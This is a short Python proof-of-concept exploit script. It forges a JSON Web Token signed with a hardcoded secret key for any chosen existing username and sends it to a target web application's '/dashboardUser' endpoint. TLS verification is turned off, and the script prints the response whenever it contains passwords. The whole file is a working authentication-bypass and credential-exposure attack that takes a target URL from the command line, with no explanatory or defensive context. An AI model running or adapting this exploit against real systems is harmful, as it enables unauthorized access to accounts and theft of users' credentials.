#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import jwt
import time
import requests
import json
import sys
import argparse
import optparse

def generateToken(username):
    headers = {  
        "alg": "HS256",
        "typ": "JWT"
    }
    salt = "2095132720951327"  
    payload = {
        "userName": username,
        "exp": '2556115145'
    }
    token = jwt.encode(payload=payload, key=salt, algorithm='HS256', headers=headers)
    return token


def poc(host, username):
    url = host + '/dashboardUser'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0',
        'X-Access-Token': generateToken(username)
    }
    
    r = requests.get(url, headers=headers, verify=False, timeout=5)
    result = r.text
    if r.status_code == 200 and 'password' in result:
        print(result)
    else:
        return False
    

if __name__ == '__main__':
    parser = optparse.OptionParser()  
    parser.add_option('-u', '--url', action="store", dest="url", help="Target url: http://ip:port")
    parser.add_option('-n', '--name', action="store", dest="username", help="Existing user name")
    options, args = parser.parse_args()

    if not options.url :
        print('Example: -u http://xx.com -n username')
        exit()

    poc(options.url,options.username)



